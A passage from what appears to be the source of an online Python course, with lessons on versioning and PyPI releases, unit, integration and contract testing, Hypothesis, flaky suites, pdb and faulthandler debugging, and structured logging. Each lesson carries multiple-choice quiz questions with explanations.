The tag matters because a version number that is not attached to a commit gives you nothing to diff when a user reports a regression in 0.4.0. Install from TestPyPI first: it is the only way to catch a wheel that is missing a subpackage, since your local checkout can import files the wheel never included.

### You cannot reuse a version number

Upload \`0.4.0\`, notice the broken wheel, delete the release, and try again. PyPI refuses. Filenames are immutable there forever, and deleting a release does not release the number, so your only path forward is \`0.4.1\`.

For a release that is published but harmful, **yank** rather than delete:

- A yanked version stays installable for anyone who already pins it exactly, so no existing lock file breaks.
- Resolvers skip it for anything new, so \`pip install myapp\` stops handing it out.

Deleting does the opposite: it breaks every build that pinned it and helps nobody.

### Automate it from the tag

\`\`\`yaml
on:
  push:
    tags: ["v*"]
jobs:
  release:
    permissions:
      id-token: write            # trusted publishing, no API token stored
\`\`\`

A release triggered by a tag runs the same steps every time. A release performed by hand on a laptop eventually ships whatever was in that working directory, uncommitted changes included.
      `,
        [
          q('You rename the keyword argument page_size to per_page and publish it as version 1.4.1. What is wrong with that?', [
            'Removing a name callers pass is breaking, so it needs a major bump',
            'Keyword arguments are not public API, so no version bump was required',
            'It should have been a minor bump, since the behaviour is unchanged',
            'Renames are acceptable if the changelog records them in that release',
          ], 0, 'Any caller writing page_size=50 stops working, and a patch number tells resolvers the upgrade is safe to take automatically, which is how the whole downstream build turned red.'),
          q('You upload 0.4.0 to PyPI, spot a broken wheel, and delete the release. What now?', [
            '0.4.0 can be uploaded again once the deletion has propagated',
            'That version number is burned, so the fix ships as 0.4.1',
            'Deleting also removes it from lock files that already pin it',
            'twine will overwrite the old files if you pass the right flag',
          ], 1, 'PyPI treats uploaded filenames as permanently taken, so deleting a release frees nothing and the only way forward is the next version number.'),
          q('What does yanking a published release do that deleting it does not?', [
            'It leaves existing exact pins working while hiding it from new resolutions',
            'It removes the files but keeps the version number free for reuse',
            'It forces every installed copy to upgrade on the next pip run',
            'It marks the version as a pre-release so only --pre will install it',
          ], 0, 'A yank warns resolvers off without breaking anyone whose lock file already names that exact version, which is why it is the correct response to a bad release.'),
        ]
      ),
      ],
      [
        q('mypy reports: Item "None" of "Course | None" has no attribute "title". What is it telling you?', [
          'The Course class is missing a title attribute',
          'The function can return None and you used the result without checking for it',
          'The annotation must use typing.Optional instead of the | syntax',
          'title needs to be annotated in the class body',
        ], 1, 'The declared return type includes None, so mypy refuses the attribute access until an is None check narrows the type.'),
        q('DEBUG=false is set in the environment and the app still runs in debug mode. Why?', [
          'Environment variable names are case sensitive',
          'os.environ caches the value from process start',
          'The variable was read before the config module loaded',
          'Every env var is a string, and the non-empty string "false" is truthy',
        ], 3, 'bool() on a string only asks whether it is empty, so any value at all — including "false" — comes out True.'),
        q('Why put your package under src/ instead of at the repository root?', [
          'It stops imports resolving to the working-directory copy instead of the installed package',
          'Build backends only accept a src layout',
          'It makes imports measurably faster',
          'pytest cannot collect tests without it',
        ], 0, 'With src/, the only importable copy is the one that was actually built and installed, so packaging mistakes fail in your tests rather than after release.'),
        q('Which code should call logging.basicConfig()?', [
          'Every module, so each controls its own format',
          'Any module that creates a logger',
          'Only the application entry point; libraries just call getLogger(__name__)',
          'None of it — basicConfig is deprecated',
        ], 2, 'Handlers and levels belong to the program being run, so a library that configures logging overrides the choices of every application that imports it.'),
      ]
    ),
      chapter(
      'Testing Beyond the Happy Path',
      'Fakes at the right boundary, generated inputs that find the cases nobody thought of, and the cure for a suite the team has stopped trusting.',
      [
      lesson('Choosing the Boundary: Unit, Integration, and Contract Tests', 13, `
A payments team shipped a release with 3,100 green tests and 94% coverage. Checkout was down for 40 minutes. A migration had renamed \`orders.total_cents\` to \`orders.amount_cents\`, and every test that touched persistence used a mock repository that happily answered to any attribute you asked for. The tests were not badly written. They were pointed at the wrong boundary.

A test boundary is the line where you stop running real code and start running a substitute. Inside the line, everything executes. Outside it, nothing does. That one choice decides what a test is even capable of catching.

### Three boundaries, three different jobs

| Boundary | Runs for real | Substituted | Catches | Blind to |
|---|---|---|---|---|
| Unit | one module and pure collaborators | clock, disk, network, database | logic, edge cases, error branches | wiring, SQL, schema drift |
| Integration | your process plus a real dependency | third party services | queries, migrations, serialisation | provider changes |
| Contract | the payload shape between two systems | everything behind it | a provider that renamed a field | your own logic |

Unit tests belong on code that decides things:

\`\`\`python
# src/billing/invoice.py
def line_total(quantity: int, unit_cents: int, discount_pct: float) -> int:
    if not 0 <= discount_pct <= 100:
        raise ValueError(f"discount out of range: {discount_pct}")
    gross = quantity * unit_cents
    return gross - round(gross * discount_pct / 100)
\`\`\`

No database, no fixture, no mock, and it runs in about 40 microseconds. Push every rule you can into shapes like this one, and the expensive tests shrink to the thin layer that is left over.

Integration tests belong on code you cannot reason about without the real thing:

\`\`\`python
# tests/integration/test_order_repo.py
import pytest

@pytest.mark.integration
def test_open_orders_excludes_cancelled(pg_conn):
    repo = OrderRepo(pg_conn)
    repo.add(Order(id=1, status="open", amount_cents=1250))
    repo.add(Order(id=2, status="cancelled", amount_cents=900))
    assert [o.id for o in repo.open_orders()] == [1]
\`\`\`

A real connection means the column name is checked by Postgres rather than by your imagination. Register the marker and split the runs so the slow tests stay opt in:

\`\`\`toml
# pyproject.toml
[tool.pytest.ini_options]
markers = ["integration: needs a real database or broker"]
addopts = "-m 'not integration'"
\`\`\`

Now bare \`pytest\` on a laptop is fast, and \`pytest -m integration\` in CI is thorough.

### The mistake: mocking your own internals

Every mock you place inside your own system freezes an implementation detail into a test. Rename a private method and forty tests go red while the program still works perfectly. A team learns from that to delete tests rather than trust them.

Put doubles at the edge of the system you own: the HTTP client, the clock, the payment gateway, the message queue. Inside that edge, use real objects. When a class is painful to construct for a test, that is design feedback about coupling, not an argument for one more patch.

### Contract tests catch what neither of the others can

An integration test proves your code works against the provider you recorded in March. It says nothing about the provider you will call tomorrow morning.

\`\`\`python
# tests/contract/test_shipping_quote.py
QUOTE_SHAPE = {"carrier": str, "price_cents": int, "eta_days": int}

@pytest.mark.contract
def test_live_quote_matches_expected_shape():
    body = httpx.get("https://api.shipco.test/v1/quote?to=SE1").json()
    for field, kind in QUOTE_SHAPE.items():
        assert isinstance(body[field], kind), f"{field} changed type"
\`\`\`

Schedule that nightly against the real provider and keep it off the critical path of a deploy, because a vendor outage should never block a release of yours. The morning \`price_cents\` becomes the string \`"1250"\`, a cron job tells you instead of a customer.

### Choosing in ten seconds

Ask what would have to break for this test to fail. If the answer is a decision your code makes, write a unit test. If it is the query, the migration, or the serialisation, write an integration test. If it is somebody else's server, write a contract test and schedule it. If the honest answer is nothing at all, delete the test: it costs runtime and blocks refactoring while proving very little.
      `,
        [
          q('Every service test replaces OrderRepo with a mock. A migration renames a column the repository selects, and the suite stays green. Why?', [
            'The mock runs the real query but ignores the returned column names',
            'pytest reuses the schema cached from the previous successful run',
            'No query is ever sent, so nothing validates the column against the database',
            'Coverage marks the repository module as executed, which suppresses the error',
          ], 2, 'A mock repository returns canned objects without touching Postgres, so the SQL and the column names in it are never checked by anything and the rename surfaces only in production.'),
          q('Why schedule the shipping provider contract test nightly instead of running it inside the deploy pipeline?', [
            'A provider outage would otherwise block a release that is perfectly fine',
            'Contract tests need a live database that the pipeline does not provide',
            'Nightly runs give the generator more time to build rare payloads',
            'Deploy pipelines are not permitted to make outbound HTTP requests',
          ], 0, 'A contract test depends on somebody else\'s uptime, so putting it on the critical path means their bad afternoon stops your deploys even when your code is correct.'),
          q('OrderRepo.open_orders() is rewritten and now selects a column that no longer exists. Which test catches it?', [
            'A unit test that builds the service around a mock repository',
            'A contract test checking the shipping provider payload shape',
            'A unit test for line_total covering a discount of exactly 100',
            'An integration test running the repository against real Postgres',
          ], 3, 'Only the integration test actually sends the statement to a database, which is the one place the column name is verified rather than assumed.'),
        ]
      ),
      lesson('Fixtures, Fakes, and Freezing Time, Randomness, and the Network', 13, `
\`test_trial_expires\` passed for eleven months. It failed on 31 January, at 09:14, on a branch that changed nothing about trials. The code added 30 days to today and the test asserted a hand written date that happened to be right for December.

Anything your code reaches for directly is something a test cannot control: the clock, the global random module, a socket, the filesystem. A seam is the place where you hand that dependency in instead. No seam, no control.

### The clock

Start with the version that cannot be tested honestly:

\`\`\`python
# src/accounts/trials.py
from datetime import date, timedelta

def trial_end() -> date:
    return date.today() + timedelta(days=30)
\`\`\`

The only test you can write restates the implementation:

\`\`\`python
def test_trial_end():
    assert trial_end() == date.today() + timedelta(days=30)   # proves nothing
\`\`\`

Change 30 to 300 and that test still passes, because both sides move together. Add a seam and the test gets an opinion:

\`\`\`python
def trial_end(today: date | None = None) -> date:
    return (today or date.today()) + timedelta(days=30)

def test_trial_end_crosses_a_month_boundary():
    assert trial_end(date(2026, 1, 15)) == date(2026, 2, 14)
\`\`\`

When the clock is buried three layers down and you cannot thread a parameter through, freeze it instead:

\`\`\`python
import time_machine

@time_machine.travel("2024-02-27 12:00 +0000")
def test_trial_end_in_a_leap_year():
    assert trial_end() == date(2024, 3, 28)
\`\`\`

\`time_machine\` patches the C level clock, so \`time.time\`, \`datetime.now\` and \`date.today\` all move together. Injection is still better where it fits: it is faster, it documents the dependency in the signature, and it survives a library upgrade.

### Randomness

\`\`\`python
import random

def sample_cohort(users: list[str], k: int) -> list[str]:
    return random.sample(users, k)
\`\`\`

Calling \`random.seed(7)\` in a test fixes today's failure and creates tomorrow's, because the seed is global process state that outlives the test. Every test that runs afterwards inherits it, and the moment a plugin shuffles test order, the results move. Pass the generator instead:

\`\`\`python
def sample_cohort(users: list[str], k: int, rng: random.Random | None = None) -> list[str]:
    return (rng or random.Random()).sample(users, k)

def test_cohort_is_reproducible():
    picked = sample_cohort(["ada", "linus", "grace", "ken"], 2, rng=random.Random(12345))
    assert picked == sample_cohort(["ada", "linus", "grace", "ken"], 2, rng=random.Random(12345))
\`\`\`

### Fakes that lie

\`Mock()\` invents any attribute you touch, and every invented attribute is truthy. That is how a retry test passes while testing nothing:

\`\`\`python
resp = Mock(status_code=500)
if resp.is_error:            # a Mock, therefore truthy, whatever the status was
    retry()
\`\`\`

Set \`status_code=200\` and the branch still runs. \`create_autospec(httpx.Response, instance=True)\` raises \`AttributeError\` on any name the real class does not have, which turns a silent pass into a loud failure. For HTTP specifically, prefer a transport level fake such as \`responses\` or \`respx\`: it exercises your real client, real headers and real JSON decoding, and it fails when you call a URL you never registered.

### Fixture scope is where fakes leak

| Scope | Built | Good for | Danger |
|---|---|---|---|
| function | once per test | anything mutable | none |
| module | once per file | expensive read only data | mutations survive into later tests |
| session | once per run | a container, a schema, a fake server | one test can poison the whole run |

A session scoped fixture returning a list of five orders looks like a clean saving until a test appends a sixth. Nothing fails immediately. A different test that counts rows fails, but only when the suite runs in the order that puts it second. Return fresh objects per test, or make the shared value immutable, and use \`yield\` so teardown runs even when the test raises.
      `,
        [
          q('Why does assert trial_end() == date.today() + timedelta(days=30) prove almost nothing about trial_end?', [
            'It fails whenever the suite happens to run across midnight',
            'It restates the implementation, so a wrong offset passes on both sides',
            'It cannot run under pytest unless a clock plugin is installed',
            'date.today ignores the system clock, so the comparison is undefined',
          ], 1, 'Both sides of the comparison compute the same expression, so changing 30 days to 300 days in the function keeps the assertion true and the test detects nothing.'),
          q('A retry test sets resp = Mock(status_code=500) while the code branches on resp.is_error. What actually happens?', [
            'Mock raises AttributeError, so the test fails with a clear message',
            'Mock returns False, so the retry branch is skipped and the test fails',
            'Mock returns 500, so the branch runs for an accidental reason',
            'Mock invents a truthy attribute, so the branch runs for any status',
          ], 3, 'A bare Mock creates any attribute you access and the result is truthy, so the retry branch would be taken even for a 200 response and the test passes without checking anything.'),
          q('A session scoped fixture returns a list of five Order objects and one test appends a sixth. What is the symptom?', [
            'Later tests see six orders, so the result depends on run order',
            'pytest raises an error about mutating a session scoped fixture',
            'The sixth order is discarded as soon as that test function returns',
            'Every test in the file is collected and executed a second time',
          ], 0, 'A session scoped object is built once and shared, so a mutation persists for the rest of the run and any test that counts the orders passes or fails depending on where it lands in the order.'),
        ]
      ),
      lesson('Property-Based Testing with Hypothesis', 14, `
\`slugify\` had fourteen parametrized cases and passed all of them. Hypothesis broke it in under a second with one character: \`"."\`. Every title made only of punctuation produced the empty slug, and the second such course hit a unique constraint in production at 02:40.

Example based tests check the inputs you thought of. A property test states something that must hold for every input, then lets a generator go looking for the counterexample.

\`\`\`python
from hypothesis import given, strategies as st
from myapp.slugs import slugify

@given(st.text(min_size=1))
def test_slug_is_never_empty(title):
    assert slugify(title) != ""
\`\`\`

\`\`\`text
Falsifying example: test_slug_is_never_empty(
    title='.',
)
\`\`\`

That output matters as much as the failure. Hypothesis found the bug with some long random string, then shrank it repeatedly while the assertion kept failing, until only the essential character was left. You get a minimal reproduction rather than a wall of noise.

### Four properties that fit almost anything

| Shape | Property | Fits |
|---|---|---|
| Round trip | \`decode(encode(x)) == x\` | JSON, CSV, price parsing |
| Invariant | the output always satisfies a rule | a total is never negative |
| Oracle | the fast version agrees with the slow one | a rewritten query builder |
| Idempotence | \`f(f(x)) == f(x)\` | normalising, slugifying |

Invariants are the easiest place to start, because you rarely know the exact answer but you always know the bounds:

\`\`\`python
from hypothesis import assume, example, given, settings, strategies as st

@st.composite
def orders(draw):
    quantity = draw(st.integers(min_value=1, max_value=500))
    unit_cents = draw(st.integers(min_value=1, max_value=100_000))
    discount = draw(st.floats(min_value=0, max_value=100, allow_nan=False))
    return quantity, unit_cents, discount

@given(orders())
def test_line_total_stays_within_bounds(order):
    quantity, unit_cents, discount = order
    total = line_total(quantity, unit_cents, discount)
    assert 0 <= total <= quantity * unit_cents
\`\`\`

### The four surprises

\`st.floats()\` with no arguments generates \`nan\`, \`inf\` and \`-0.0\`. Since \`nan != nan\`, a round trip property fails on roughly the first run, and the bug is in the test. Pass \`allow_nan=False, allow_infinity=False\` when the real input cannot contain them.

\`assume(x != 0)\` discards an example rather than failing it, which is fine in moderation. Filter out most of the space and Hypothesis raises \`FailedHealthCheck\` for too many rejections. Generate the right shape with a strategy instead of throwing away the wrong one.

Every example gets a deadline of 200 milliseconds by default. A property that touches sqlite hits \`DeadlineExceeded\` on a slow CI worker, and the reflex fix, \`@settings(deadline=None)\`, quietly discards a performance signal. Prefer keeping properties on pure functions.

Hypothesis stores failures in a local \`.hypothesis/examples\` directory and replays them first. CI containers are usually fresh, so that memory does not exist there. Pin every bug you find:

\`\`\`python
@example(title=".")
@given(st.text(min_size=1))
def test_slug_is_never_empty(title):
    assert slugify(title) != ""
\`\`\`

Now the regression is checked on every run, in one deterministic case, whatever the generator feels like doing that day.

### Cost, and where it pays

The default is 100 examples per property, so a property test costs roughly a hundred unit tests in wall clock time. Keep them on pure logic: parsers, encoders, money arithmetic, date ranges, anything with edge cases you would not enumerate by hand. Run \`@settings(max_examples=25)\` in the fast lane and a nightly job with several hundred.

When state is the interesting part, \`RuleBasedStateMachine\` generates whole sequences of calls and checks an invariant after each one. It is how you find the ordering of cache eviction and queue acknowledgement that no human writes down, and the failure it prints is a short, replayable script of method calls.
      `,
        [
          q('A round trip property using @given(st.floats()) fails almost immediately even though the encoder is correct. What is the cause?', [
            'Strategies draw values in an order the encoder cannot handle',
            'Float strategies are rejected unless a deadline is configured',
            'The default strategy yields nan, which is never equal to itself',
            'Comparing a decoded float to the original always evaluates false',
          ], 2, 'st.floats() includes nan by default and nan compares unequal to itself, so the equality in a round trip property fails on the value rather than on any real bug.'),
          q('Hypothesis generated 60 random strings and then reported a falsifying example of title=\'.\'. What is that value?', [
            'The first input the strategy produced during this run',
            'The smallest failing input, shrunk down from a larger one',
            'A value copied from the parametrized cases in the same file',
            'The input on which the property took the longest to evaluate',
          ], 1, 'After finding any failure Hypothesis repeatedly simplifies the input while the assertion keeps failing, so the reported example is a minimal reproduction rather than the one it happened to hit first.'),
          q('Hypothesis has already found the \'.\' bug locally. Why also add @example(title=\'.\') to the test?', [
            'It prevents the strategy from generating that input again',
            'It raises max_examples so the search explores more inputs',
            'It marks the property as verified and skips it in later runs',
            'CI containers have no example database, so it would not replay',
          ], 3, 'The replay database lives in a local .hypothesis directory that a fresh CI container does not have, so pinning the case with @example is what makes the regression checked on every run.'),
        ]
      ),
      lesson('Flaky Tests, Slow Suites, and Test Data at Scale', 14, `
A suite of 6,200 tests took 11 minutes and failed about one run in six, always on a test that passed when rerun. Someone added a retry button. Four months later a genuine regression shipped on a Friday, because a red build had stopped meaning anything to anybody.

Flakiness is not random. It is hidden shared state, and there are only a handful of sources.

### Find the cause before you fix anything

| Symptom | Usual cause | Command that proves it |
|---|---|---|
| Fails only after another test | global state, a leaked patch | \`pytest --randomly-seed=1712\` |
| Fails near midnight or month end | the real clock | \`grep -rn "datetime.now\\|date.today" src/\` |
| Fails only under \`-n 4\` | shared file, port, or database row | \`pytest -p no:xdist\` |
| List order differs run to run | set or dict iteration | rerun with a different \`PYTHONHASHSEED\` |
| Fails one run in fifty | a \`time.sleep\` used as a synchroniser | \`pytest --count=50 tests/test_jobs.py\` |

The hash seed one catches people out. Python randomises string hashing per process, so \`assert list(tags) == ["api", "python"]\` on a set passes about half the time and fails the rest, with no code change between runs. Sort in the assertion, or compare sets to sets.

Sleeps are the other reliable source. A worker that usually finishes in 120 milliseconds gets \`time.sleep(0.5)\` in the test, which is both slow and wrong on a loaded CI box. Poll for the condition instead:

\`\`\`python
def wait_until(predicate, timeout=2.0, interval=0.01):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return
        time.sleep(interval)
    raise AssertionError("condition never became true")
\`\`\`

Quarantine with an owner and a date, never an open ended \`@pytest.mark.skip\`. A skipped test that nobody owns is a deleted test that still costs a line in the report.

### Where 11 minutes actually goes

\`\`\`bash
python -m pytest --durations=25
\`\`\`

On that suite the answer was one fixture: a \`db\` fixture creating the schema for every test, 78 milliseconds each, 8 of the 11 minutes. Build it once and roll back per test:

\`\`\`python
@pytest.fixture(scope="session")
def engine():
    eng = create_engine(TEST_URL)
    Base.metadata.create_all(eng)
    yield eng
    eng.dispose()

@pytest.fixture
def session(engine):
    conn = engine.connect()
    tx = conn.begin()
    db = Session(bind=conn)
    yield db
    db.close()
    tx.rollback()      # every row this test wrote disappears
    conn.close()
\`\`\`

Each test still starts clean, and the create cost is paid once rather than 6,200 times. After that, \`pytest -n auto\` with xdist splits the rest across cores. Two things break under it: anything binding a fixed port, and anything writing a hardcoded path such as \`/tmp/report.json\`. Both are the same bug, a shared resource with a fixed name, and \`tmp_path\` plus a port of 0 fixes both.

### Test data that survives a growing team

The shared fixture file is the classic trap. Ten people append rows to \`sample_orders\`, then a test asserting \`len(open_orders()) == 7\` breaks because someone else needed an eighth order for something unrelated. Build data per test with defaults instead:

\`\`\`python
def make_order(**overrides):
    base = dict(id=1, status="open", amount_cents=1250, customer="ada@example.com")
    return Order(**{**base, **overrides})

def test_cancelled_orders_are_hidden(session):
    session.add(make_order(id=1))
    session.add(make_order(id=2, status="cancelled"))
    assert [o.id for o in open_orders(session)] == [1]
\`\`\`

The test names only the field it cares about, \`status\`, and the reader knows instantly what the case is about. The other rule is to assert on the rows you created, never on a global count, so another engineer adding data cannot break your test from a different file.
      `,
        [
          q('assert list(tags) == [\'api\', \'python\'] passes on some runs and fails on others, with no code change in between. Why?', [
            'Set iteration order changes with the per process hash seed',
            'Comparing a list against a set is always false in Python',
            'pytest sorts collections before comparing them on some runs',
            'Sets deduplicate lazily, so an element can arrive after the assert',
          ], 0, 'Python randomises string hashing per process, so the iteration order of a set of strings differs between runs and an assertion on that order is a coin toss.'),
          q('Why does a session scoped schema plus a per test transaction rollback beat recreating the schema for every test?', [
            'Rollback also resets the sequences and indexes the schema defines',
            'A shared schema lets tests deliberately read each other\'s rows',
            'Each test still starts clean without paying the create cost 6,200 times',
            'Transactions make one database safe to share between xdist workers',
          ], 2, 'The rollback discards everything the test wrote, so isolation is preserved while the expensive create_all call runs once per session instead of once per test.'),
          q('A team wires a retry button that reruns any failing test once. What does that cost them?', [
            'Reruns double the compute bill attached to every pull request',
            'A genuine regression that fails intermittently now passes on retry',
            'The durations report is lost whenever a test has been rerun',
            'Reruns reset fixtures, so teardown code no longer executes',
          ], 1, 'Retrying treats every failure as noise, so a real bug that only triggers on some runs is silently marked green and ships alongside the flakes it was meant to hide.'),
        ]
      ),
      ],
      [
      q('An 11 minute suite must finish in 3 minutes and no tests may be deleted. Which move do you make first?', [
        'Raise the property test example count so fewer tests are needed',
        'Convert the integration tests into contract tests run nightly',
        'Add a shuffling plugin so the slow tests spread across runs',
        'Read --durations=25 and fix the fixture sitting at the top of it',
      ], 3, 'Runtime is almost always concentrated in one or two fixtures, so measuring first tells you where the minutes are instead of spreading effort across tests that were never slow.'),
      q('A pricing function is pure, a repository talks to Postgres, and a courier API is external. Which allocation fits?', [
        'Property tests on the function, integration on the repository, a scheduled contract test on the courier',
        'Mocks for all three, so the whole suite finishes in under a second on any laptop',
        'Integration tests for all three, because only real dependencies prove real behaviour',
        'Property tests for all three, since generated inputs reach every boundary equally',
      ], 0, 'Each boundary catches a different class of bug, so pure logic gets generated inputs, persistence gets a real database, and somebody else\'s server gets a scheduled shape check.'),
      q('Your suite now uses a frozen clock and an injected seeded generator. Which failure do those still not prevent?', [
        'A trial length assertion that breaks on the last day of February',
        'A courier changing price_cents from an integer to a quoted string',
        'A cohort sample that picks different users on every single run',
        'A nightly report test that breaks when the suite crosses midnight',
      ], 1, 'Freezing time and seeding randomness remove nondeterminism inside your process, while a provider changing a field type is external and only a contract test against the live API will reveal it.'),
      q('Why is a mock placed in the middle of your own system worse than one at the HTTP boundary?', [
        'Mocks cannot record calls unless they stand in for an external client',
        'The mock library refuses to patch objects defined inside your package',
        'It freezes an internal detail, so refactoring breaks tests of working code',
        'Internal mocks run slower because the real module still has to import',
      ], 2, 'A mock asserts on how your code is structured internally, so renaming a method or moving a call turns tests red without any behaviour changing, which teaches the team to distrust the suite.'),
      ]
    ),
    chapter(
      'Debugging What You Cannot Reproduce',
      'Post mortem debugging, structured events, traces and live profilers that turn a vague production report into one specific line of code.',
      [
      lesson('Post Mortem Debugging with pdb, Tracebacks, and faulthandler', 14, `
The alert fires at 04:12 and says \`KeyError: 'shipping_address'\`. You get eleven lines of traceback and nothing else. The line that raised is correct. The bug is four frames above it, in the function that built the dict, and the log tells you nothing about what was actually in it.

### Read the traceback from the bottom, then walk up

The last line is where it blew up. The frames above are how you got there. Python 3.11 and later mark the exact subexpression:

\`\`\`text
Traceback (most recent call last):
  File "/app/src/orders/api.py", line 88, in create_order
    return build_label(order, warehouse)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/src/orders/labels.py", line 31, in build_label
    street = order["shipping_address"]["street"]
             ~~~~~^^^^^^^^^^^^^^^^^^^^
KeyError: 'shipping_address'
\`\`\`

Those carets pay for themselves on a line like \`a["x"]["y"]\`, where the message alone leaves you guessing which subscript failed.

### The sentence between two tracebacks assigns blame

| Joining text | What it means |
|---|---|
| During handling of the above exception, another exception occurred | your \`except\` block itself raised, usually by accident |
| The above exception was the direct cause | somebody wrote \`raise ... from err\` on purpose |

The first one is a signal, not noise. It normally means the handler assumed a shape the failing object did not have. Reach for \`from err\` when the original really is the cause, and \`from None\` only when you are certain the original is uninteresting, because it deletes evidence forever.

Facts you have at the raise site rarely survive to the log unless you attach them:

\`\`\`python
except httpx.HTTPStatusError as err:
    err.add_note(f"order_id={order.id} warehouse={warehouse.code}")
    raise
\`\`\`

\`add_note\` rides along with the exception and prints under the traceback.

### Never log an exception as a string

\`\`\`python
except Exception as err:
    log.error("label failed: %s", err)     # one line, zero frames
\`\`\`

That is the single most common way a team ends up unable to debug its own service. The fix costs one word:

\`\`\`python
except Exception:
    log.exception("label failed for order %s", order.id)
\`\`\`

\`log.exception\` sets \`exc_info=True\`, so the formatter writes the full chain. Chapter 7 configured the handler; this is what makes the handler worth having.

### Post mortem: the frames are still alive

When the crash is reproducible in a batch job, do not add print statements. Run the whole thing under the debugger and let it stop only if something breaks:

\`\`\`bash
python -m pdb -c continue -m myapp.import_run
\`\`\`

On the exception you land in the frame that raised, with every local still in memory.

| Command | What it does |
|---|---|
| \`u\` / \`d\` | move up or down the call stack |
| \`args\` | print the arguments of the current frame |
| \`pp order\` | pretty print a value |
| \`interact\` | open a full REPL inside that frame |

\`interact\` is the one people miss. You get a normal Python prompt with the frame's locals, so you can rebuild the failing call and try the fix in place.

For a long lived service, capture instead of interact:

\`\`\`python
import sys, traceback, pickle

def dump_crash(exc_type, exc, tb):
    frames = {k: repr(v) for k, v in tb.tb_frame.f_locals.items()}
    with open("/var/log/crash.pkl", "wb") as fh:
        pickle.dump({"tb": traceback.format_exception(exc_type, exc, tb),
                     "locals": frames}, fh)

sys.excepthook = dump_crash
\`\`\`

### Crashes and hangs that produce no traceback

A segfault inside a C extension kills the interpreter before any Python code runs, so you get a bare \`Segmentation fault: 11\`. Set \`PYTHONFAULTHANDLER=1\` and you get the Python stack that was executing when the process died.

A hang is worse, because nothing happens at all. Arm a dump ahead of time:

\`\`\`python
import faulthandler, signal
faulthandler.enable()
faulthandler.register(signal.SIGUSR1)          # kill -USR1 <pid> prints all threads
faulthandler.dump_traceback_later(60, repeat=True, exit=False)
\`\`\`

Now a stuck worker prints every thread's stack every 60 seconds, and you can ask a live one for its stack without restarting it. Restarting is what usually destroys the only copy of the evidence.
      `,
        [
          q('A production traceback prints a KeyError, then the line \'During handling of the above exception, another exception occurred\', then a ValueError. What does that tell you?', [
            'The KeyError was re-raised on purpose with a raise from clause',
            'The ValueError ran first and the KeyError followed it later',
            'The ValueError was raised inside a handler for the KeyError',
            'The KeyError was suppressed with from None before the ValueError',
          ], 2, 'That joining sentence marks an implicit chain, meaning the second exception was raised while the except block for the first one was running, so the handler itself is where to look.'),
          q('Your handler runs log.error(\'label failed: %s\', err) and the on call engineer has only that one line. What did the log lose?', [
            'The frames and line numbers showing where the failure came from',
            'The message text, because %s calls repr on the exception object',
            'The timestamp, since exception records skip the standard formatter',
            'The logger name, which is only attached by log.exception',
          ], 0, 'Formatting an exception as a string keeps the message and drops the traceback, so nothing in the log says which call path produced the failure.'),
          q('A worker stops responding, uses no CPU, never crashes and writes no further logs. Which approach gets a Python stack out of it?', [
            'Run python -m pdb -c continue, which attaches to the running pid',
            'Read cProfile output, which prints the stack when a process stalls',
            'Call traceback.print_exc from the supervisor that started it',
            'Register faulthandler on SIGUSR1, then send kill -USR1 to the pid',
          ], 3, 'faulthandler can be armed in advance to dump every thread\'s stack when it receives a signal, which works on a live hung process without restarting it and losing the state.'),
        ]
      ),
      lesson('Structured Logs, Correlation IDs, and Sampling Under Load', 13, `
Forty million log lines a day. You grep for \`failed\` and get 9,412 hits, none of which share a field you can group by, and the one request you care about is spread across four services and three of those lines.

### Log events, not sentences

\`\`\`python
log.info(f"user {user.id} checkout failed after {n} retries in {ms}ms")
\`\`\`

That line is unsearchable. Every value is welded into prose, so no aggregator can answer "how many checkouts failed for plan=free yesterday". Move the values into fields:

\`\`\`python
log.info("checkout.failed", extra={
    "user_id": user.id, "plan": user.plan, "retries": n, "duration_ms": ms,
})
\`\`\`

With a JSON formatter the record becomes one object per line:

\`\`\`json
{"ts":"2026-03-04T04:12:09Z","level":"INFO","event":"checkout.failed",
 "user_id":"u_88213","plan":"free","retries":3,"duration_ms":4180,
 "request_id":"01HQ7X9K","trace_id":"4bf92f3577b34da6a3ce929d0e0e4736"}
\`\`\`

Keep the message a stable event name. \`checkout.failed\` never changes, so a dashboard built on it does not break when someone rewords the sentence. Field names have to be stable too: if one service writes \`user_id\` and another writes \`userId\`, the aggregator treats them as unrelated columns and your query silently returns half the data.

### One id, threaded through everything

\`\`\`python
import contextvars, logging, uuid

request_id = contextvars.ContextVar("request_id", default="-")

class RequestIdFilter(logging.Filter):
    def filter(self, record):
        record.request_id = request_id.get()
        return True

async def middleware(request, call_next):
    rid = request.headers.get("X-Request-ID") or uuid.uuid4().hex[:16]
    token = request_id.set(rid)
    try:
        response = await call_next(request)
    finally:
        request_id.reset(token)
    response.headers["X-Request-ID"] = rid
    return response
\`\`\`

Use \`contextvars\`, not \`threading.local\`. Under asyncio a single thread interleaves thousands of requests, so a thread local slot is shared by all of them and your ids get stamped onto other people's log lines. \`ContextVar\` follows the task, not the thread.

Then pass \`X-Request-ID\` on every outbound call, and accept an inbound one when the caller already has it. That is what turns four services into one searchable story, and it costs nothing to add on day one against hours of correlation by timestamp later. Timestamps do not work: two servers drift by 300 ms and the ordering you infer is fiction.

### Sample requests, never lines

At 40,000 requests per second with 12 lines each at 250 bytes, you are writing about 10 TB a day before compression. Something has to go. The wrong way is a coin flip per line:

\`\`\`python
if random.random() < 0.01:
    log.debug("cart.priced", extra={"total": total})     # incoherent
\`\`\`

You keep 1% of lines, which means every request has 1% of its story. Nobody can follow anything. Decide once, per request, and let every line inherit that decision:

\`\`\`python
sampled = contextvars.ContextVar("sampled", default=True)

class SampleFilter(logging.Filter):
    def filter(self, record):
        return record.levelno >= logging.WARNING or sampled.get()
\`\`\`

Set \`sampled\` in the middleware from a hash of the request id, keep 1%, and let warnings and errors through unconditionally. Now 1% of requests have complete traces and 100% of failures are intact.

| Decision | Volume kept | Debuggability |
|---|---|---|
| Everything at DEBUG | 100% | perfect, until finance notices |
| Random 1% of lines | 1% | useless, no request is complete |
| 1% of requests plus all errors | roughly 2% | every kept request tells the whole story |

### Logging sits in your request path

\`logging\` is synchronous. A handler that ships to a network collector puts that network call inside the request that produced the line, and a slow collector becomes a latency spike with no obvious cause. Push it off the hot path:

\`\`\`python
from logging.handlers import QueueHandler, QueueListener
from queue import Queue

queue = Queue(-1)
listener = QueueListener(queue, shipping_handler, respect_handler_level=True)
listener.start()
logging.getLogger().addHandler(QueueHandler(queue))
\`\`\`

